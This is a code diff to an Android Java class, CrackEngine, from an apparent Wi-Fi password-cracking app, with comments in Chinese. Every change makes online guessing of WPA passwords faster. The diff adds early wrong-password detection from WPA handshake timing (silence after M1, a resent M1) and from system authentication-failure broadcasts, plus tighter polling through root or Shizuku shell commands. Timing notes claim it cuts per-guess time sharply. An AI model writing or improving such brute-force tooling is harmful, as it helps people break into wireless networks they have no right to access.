@@ -148,6 +148,14 @@ public final class CrackEngine {
      */
     private NetworkWatcher watcher;
 
+    /**
+     * 认证失败**系统广播**监听器（第三级早退的信号源，2026-10-23 新增）。
+     *
+     * 与日志判据的区别：它走 framework 广播，**不依赖 logcat**，
+     * 因此不受系统日志配额影响（实测日志有时 0 行，是早退失效的主因）。
+     */
+    private WifiAuthFailureWatcher authWatch;
+
     /** shell 通道（Shizuku/Root），null 表示走系统 API */
     private ShellChannel shell;
 
@@ -161,6 +169,7 @@ public final class CrackEngine {
     public CrackEngine(Context ctx, int mode) {
         this.appCtx = ctx.getApplicationContext();
         this.watcher = new NetworkWatcher(appCtx);
+        this.authWatch = new WifiAuthFailureWatcher(appCtx);
         this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
         this.cm = (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
         this.mode = mode;
@@ -186,6 +195,48 @@ public final class CrackEngine {
      *
      * 与正式破解走同一条路径（tryOne），只是 SSID 和密码由界面直接给出。
      */
+    /**
+     * 第二级早退的静默窗口（毫秒）。
+     *
+     * <p>真机实测（2026-10-23，B214）：正确密码从「命令发出」到「四条件成立（拿到 IP）」
+     * 只要 670~722 ms；M2 是在 M1 之后约 4ms 发出的，AP 的 M3/M4 紧随其后。
+     * 而错误密码时，AP 要等到 **1.0 秒后**才重发 M1。
+     * 因此「M1 出现后 600ms 内没有任何握手进展」= 密码错误，且留有约 10 倍余量。
+     *
+     * <p>代价说明：本判据在极端拥塞的 AP 上可能把**正确**密码误判为失败（只会漏判，
+     * 绝不会误判成功）——与本项目「宁可漏判，不可误判」的一贯取舍一致。
+     */
+    public static final long EARLY_FAIL_SILENCE_MS = 600L;
+
+    /**
+     * 第二级早退判据（纯函数，便于离线单测）。
+     *
+     * @param m1Seen       本次尝试已见到 M1（RX message 1 of 4-Way Handshake）
+     * @param negotiated   已见到属于目标的握手完成（Key negotiation completed）
+     * @param msSinceM1    距首次看到 M1 的毫秒数
+     * @param silenceMs    静默窗口阈值
+     */
+    public static boolean m1SilentImpliesWrongKey(boolean m1Seen, boolean negotiated,
+                                                  long msSinceM1, long silenceMs) {
+        return m1Seen && !negotiated && msSinceM1 >= silenceMs;
+    }
+
+    /**
+     * 早退判据的**纯函数**形式（便于离线单测）。
+     *
+     * <p>规则：本次尝试里 M1 被重发（收到 ≥2 次 "RX message 1 of 4-Way Handshake"）
+     * 且没有出现属于目标的握手完成证据 → 密码必然错误。
+     *
+     * <p>真机依据（2026-10-23，ColorOS 15）：M1#2 稳定出现在 M1#1 + 0.96 秒；
+     * 正确密码不会产生重发的 M1（M1#1 后 ~200ms 内即走 M3/M4）。
+     *
+     * @param m1Count     本次尝试里收到 M1 的次数
+     * @param successSeen 是否已看到**属于目标 BSSID** 的握手完成（Key negotiation completed）
+     */
+    public static boolean m1RetryImpliesWrongKey(int m1Count, boolean successSeen) {
+        return !successSeen && m1Count >= 2;
+    }
+
     public Attempt tryOneForTest(String ssid, String password, long timeoutMs) {
         io.github.wlmosv_png.wpaforge.core.NetRecord t =
                 new io.github.wlmosv_png.wpaforge.core.NetRecord(
@@ -1014,6 +1065,16 @@ public final class CrackEngine {
         long deadline = t0 + timeoutMs;
         // 捕获握手第 1 帧后可动态延长看门狗，只延长一次
         boolean m1Extended = false;
+        // M1 重发 = 密码错误的早期信号（实测：第 2 次 M1 稳定出现在第 1 次之后约 0.96 秒）。
+        // 命中即先"武装"，再过 120ms 复核一次才判失败 ——
+        // 万一那条 M1 是丢包重传、而密码其实正确，这 120ms 里握手会完成，
+        // 上面的成功判据会先返回 SUCCESS，不会造成漏判。
+        boolean m1RetryArmed = false;
+        long m1RetryArmedAt = 0L;
+        // 首次看到 M1 的时刻（第二级早退用）
+        long m1FirstSeenAt = 0L;
+        // 认证失败广播的“武装”时刻（第三级早退的 120ms 复核用）
+        long authArmedAt = 0L;
         // 是否已观察到「系统离开了命令前的那条连接」——回连判据的前置条件
         boolean leftBaseline = false;
         // 是否出现过「连着目标但 netId 对不上」——只用于收尾时把话说清楚，不作否决
@@ -1041,11 +1102,19 @@ public final class CrackEngine {
         // 探测「日志能不能读」要用**真正要读的那个源**：
         // 以前这里探测的是状态机日志（-e ClientModeImpl，本机只有 ContextImpl 噪音），
         // 与后面实际读的 wpa_supplicant 不是一回事，探测结论没有意义。
+        // 日志可读性：**不能一次性探测**（2026-10-23 实测翻车）。
+        //
+        // 旧写法是在这里读一次 `logcat -d -s wpa_supplicant`，看输出里有没有
+        // "wpa_supplicant" 字样。但此刻缓冲刚被 `logcat -c` 清空、连接命令才发出
+        // 几毫秒，日志里**必然还没有任何行** → 探测失败 → logReadable 恒为 false
+        // → 下面整段日志判据（含快速失败）被永久跳过，只能干等状态机。
+        //
+        // 实测证据：把早退判据加进去后，App 仍然是 5.82 秒/条（99 秒 17 条），
+        // 而同样的判据在 shell 靶场里是 2.08 秒/条 —— 差别就在这里。
+        //
+        // 现在改成**惰性**：每轮照常读日志，一旦读到过 wpa_supplicant 的行就置位。
+        // 读日志本身每轮约 40ms，代价可接受；换来的是快速路径真的会生效。
         boolean logReadable = false;
-        {
-            String probe = WpaLogReader.read(shell, 0);
-            if (probe != null && probe.contains("wpa_supplicant")) logReadable = true;
-        }
 
         // ══════════════════════════════════════════════════════════════
         //  唯一判据：Supplicant state: COMPLETED
@@ -1070,9 +1139,13 @@ public final class CrackEngine {
                 return new Attempt(password, Verdict.ABORTED,
                         SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
             }
-            // 100ms：实测 `su -c cmd wifi status` 只要 18ms、一次 logcat 读约 20ms，
-            // 每轮真实成本不到 50ms —— 所以间隔可以比原来（200ms）密一倍。
-            sleep(100);
+            // 间隔自适应（2026-10-23 实测后调整）：
+            //   前 1.2 秒 = 全速轮询（间隔 20ms）。这一段时间里会出现最早的成功证据
+            //   （实测正确密码 950ms 内完成）和最早的失败证据（M1#2 约在 1.5~2.5s），
+            //   轮询越密，判定越早，早退越有效。
+            //   1.2 秒之后 = 80ms 一轮，省 CPU、也不影响早退（那时信号已经来了）。
+            // 每轮真实成本：`su -c cmd wifi status` ~17ms + 一次 logcat 读 ~40ms。
+            sleep(SystemClock.uptimeMillis() - t0 < 1200L ? 20L : 80L);
 
             String st = null;
             try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
@@ -1213,9 +1286,13 @@ public final class CrackEngine {
             // 恰恰是**最快**的失败信号。等 1.2 秒才看一眼，
             // 相当于每条候选白白多等一个轮询周期。
             // 一次 logcat 读只要 239ms（真机实测），付得起。
-            if (logReadable) {
+            {
                 String wlog = WpaLogReader.read(shell, 400);
                 if (wlog != null && !wlog.isEmpty()) {
+                    if (!logReadable && wlog.contains("wpa_supplicant")) {
+                        logReadable = true;   // 惰性置位：只要看到过就长期有效
+                        android.util.Log.i(TAG, "日志通道确认可读");
+                    }
                     logRounds++;
                     boolean tried = WpaLogReader.sawAssociateFor(wlog, target.ssid);
                     if (tried) sawAttempt = true;
@@ -1246,6 +1323,87 @@ public final class CrackEngine {
                     // 带归属的失败信号优先：`CTRL-EVENT-SSID-TEMP-DISABLED ssid="X"` 里
                     // 有 SSID，能确认是目标的失败。另外两种（Handshake failed / ASSOC-REJECT）
                     // 不带归属，所以仍要求本次见过目标的关联尝试。
+                    // ── 早期失败（第三级，最可靠）：系统广播「认证失败」 ────────────
+                    // framework 在 WPA 握手失败时发 SUPPLICANT_STATE_CHANGED_ACTION +
+                    // ERROR_AUTHENTICATING（系统弹的「密码错误」对话框就靠它）。
+                    // 这条信号**不经过 logcat**，厂商日志配额砍不掉它，也不需要 root。
+                    // 归属：必须发生在「本条命令发出之后」，且本轮没有成功证据。
+                    // 再等 120ms 复核一次 —— 万一这条候选其实是对的，
+                    // 这 120ms 里的成功判据会先返回 SUCCESS，不会漏判。
+                    if (authWatch != null && authWatch.isRegistered()) {
+                        boolean succ = WpaLogReader.sawNegotiatedFor(wlog, target.bssid);
+                        if (WifiAuthFailureWatcher.ssidMatches(authWatch.lastErrorSsid(),
+                                    target.ssid)
+                                && WifiAuthFailureWatcher.authErrorImpliesWrongKey(
+                                    authWatch.lastErrorAt(), commandAt, succ)) {
+                            if (authArmedAt == 0L) {
+                                authArmedAt = SystemClock.uptimeMillis();
+                            } else if (SystemClock.uptimeMillis() - authArmedAt >= 120L) {
+                                long ms = SystemClock.uptimeMillis() - t0;
+                                android.util.Log.i(TAG, "早期失败(第三级): 系统广播认证失败");
+                                return new Attempt(password, Verdict.AUTH_FAIL, ms,
+                                        L.s("系统报告认证失败 → 密码错误",
+                                            "system reported auth failure -> wrong passphrase"),
+                                        "authcast");
+                            }
+                        }
+                    }
+
+                    // ── 早期失败（第二级，最快）：M1 之后静默 ────────────────────
+                    // 真机：正确密码从命令到「四条件成立」只要 670~722ms，M2 在 M1 后 4ms
+                    // 发出、M3/M4 紧随；错误密码时 AP 要等 1.0 秒才重发 M1。
+                    // 所以 M1 后 600ms 内没有任何「Key negotiation completed」→ 密码错。
+                    // 只可能漏判、不可能误判（成功仍由四条件同行独占判定）。
+                    // 归属保护：优先用 M1 行自带的 BSSID（可靠）；
+                    // BSSID 缺失时才退回「见过目标的关联行」。
+                    boolean targetBssidKnown = target.bssid != null && !target.bssid.isEmpty();
+                    int m1ForTarget = targetBssidKnown
+                            ? WpaLogReader.countHandshakeM1For(wlog, target.bssid) : 0;
+                    boolean m1SeenForTarget = targetBssidKnown
+                            ? (m1ForTarget >= 1)
+                            : (tried && WpaLogReader.sawHandshakeM1(wlog));
+                    int m1CountForTarget = targetBssidKnown
+                            ? m1ForTarget
+                            : (tried ? WpaLogReader.countHandshakeM1(wlog) : 0);
+
+                    if (m1SeenForTarget) {
+                        if (m1FirstSeenAt == 0L) m1FirstSeenAt = SystemClock.uptimeMillis();
+                        boolean negotiated = WpaLogReader.sawNegotiatedFor(wlog, target.bssid);
+                        if (m1SilentImpliesWrongKey(true, negotiated,
+                                SystemClock.uptimeMillis() - m1FirstSeenAt,
+                                EARLY_FAIL_SILENCE_MS)) {
+                            long ms = SystemClock.uptimeMillis() - t0;
+                            android.util.Log.i(TAG, "早期失败(第二级): M1 后 "
+                                    + EARLY_FAIL_SILENCE_MS + "ms 无握手进展");
+                            return new Attempt(password, Verdict.AUTH_FAIL, ms,
+                                    L.s("M1 之后握手无进展 → 密码错误",
+                                        "no handshake progress after M1 -> wrong passphrase"),
+                                    "m1silent");
+                        }
+                    }
+
+                    // ── 早期失败：M1 被重发（2026-10-23 真机实测定论）─────────────
+                    // AP 没收到有效 M2 时每 ~1.0s 重发一次 M1；看到第 2 次 M1
+                    // 就已经确定密码错，不必再等 `Handshake failed`（那还要多等 2~3 秒）。
+                    // 归属保护：要求本次见过「目标 SSID 的关联行」，避免把
+                    // 系统回连**别的**网络时产生的 M1 算到这条候选头上。
+                    int m1Count = m1CountForTarget;
+                    boolean successSeen = WpaLogReader.sawNegotiatedFor(wlog, target.bssid);
+                    if (m1RetryImpliesWrongKey(m1Count, successSeen)) {
+                        if (!m1RetryArmed) {
+                            m1RetryArmed = true;
+                            m1RetryArmedAt = SystemClock.uptimeMillis();
+                        } else if (SystemClock.uptimeMillis() - m1RetryArmedAt >= 120L) {
+                            long ms = SystemClock.uptimeMillis() - t0;
+                            android.util.Log.i(TAG, "早期失败: M1 重发 " + m1Count
+                                    + " 次（握手无进展）");
+                            return new Attempt(password, Verdict.AUTH_FAIL, ms,
+                                    L.s("M1 被重发（握手无进展）→ 密码错误",
+                                        "M1 retransmitted (no handshake progress) -> wrong passphrase"),
+                                    "m1retry");
+                        }
+                    }
+
                     if (WpaLogReader.sawWrongKeyFor(wlog, target.ssid)
                             || (tried && (WpaLogReader.sawHandshakeFailure(wlog)
                                     || WpaLogReader.sawAssocReject(wlog)))) {
@@ -1493,15 +1651,10 @@ public final class CrackEngine {
         final String ssidBefore = snapshotSsid();
         final long netIdBefore = currentNetId();
 
-        // 日志在这一轮是否可读（Shizuku 读不到，root 可以）
-        // 探测「日志能不能读」要用**真正要读的那个源**：
-        // 以前这里探测的是状态机日志（-e ClientModeImpl，本机只有 ContextImpl 噪音），
-        // 与后面实际读的 wpa_supplicant 不是一回事，探测结论没有意义。
-        boolean logReadable = false;
-        {
-            String probe = WpaLogReader.read(shell, 0);
-            if (probe != null && probe.contains("wpa_supplicant")) logReadable = true;
-        }
+        // 与 tryOneShell 同样的问题（2026-10-23 一起修）：
+        // 这里原本也在“缓冲刚清空”的时刻一次性探测，探测必然失败 →
+        // 复验的日志判据被整段跳过。改为无条件进入，读到内容即视为可读。
+        boolean logReadable = true;
 
         long deadline = t0 + timeoutMs;
         while (SystemClock.uptimeMillis() < deadline) {
@@ -1512,7 +1665,7 @@ public final class CrackEngine {
             sleep(150);
 
             // 判据 A：状态机日志（root）
-            if (logReadable) {
+            {
                 String stateLog = WifiStateLog.read(shell, 600);
                 if (stateLog != null && WifiStateLog.sawConnectedFor(stateLog, target.ssid)) {
                     long ms = SystemClock.uptimeMillis() - t0;
@@ -1606,6 +1759,9 @@ public final class CrackEngine {
         if (watcher != null) {
             watcher.clear();
             watcher.start();
+        }
+        if (authWatch != null) {
+            authWatch.start();
             // 把监听器状态打到 UI 上。
             // 判定完全依赖它，如果它没生效，
             // 必须能从界面看出来，而不是去翻 logcat。
@@ -1853,6 +2009,7 @@ public final class CrackEngine {
         } finally {
             lastPureTryMs = pureTryMs;
             if (watcher != null) watcher.stop();
+            if (authWatch != null) authWatch.stop();
             String outcome;
             if (hit != null) outcome = "DONE_HIT";
             else if (pauseFlag.get()) outcome = "PAUSED";
